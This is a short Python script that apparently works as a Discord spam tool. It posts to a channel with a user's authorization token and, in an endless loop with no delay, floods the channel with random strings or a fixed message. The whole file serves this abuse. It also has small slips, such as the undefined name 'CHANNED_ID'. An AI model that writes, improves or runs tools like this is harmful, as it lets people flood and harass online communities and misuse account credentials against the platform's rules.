import random
import requests


letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXZY'


class Discord:
    def __init__(self, channel_id: int, auth_id: str):
        self.channel_id = channel_id
        self.auth_id = auth_id

    @staticmethod
    def random_string(length: int) -> str:
        return ''.join(random.choice(letters) for i in range(length))

    def send(self, message: str):
        return requests.post(f'https://discord.com/api/v9/channels/{self.channel_id}/messages', data={'content': message}, headers={'authorization': self.auth_id})

    def spam(self, message: str = None, length: int = None):
        while True:
            if message is None:
                _length = random.randint(4, 16) if length is None else length
                self.send(self.random_string(_length))
            else:
                self.send(message)


if __name__ == '__main__':
    discord = Discord(CHANNED_ID, AUTH_ID)
    discord.spam()
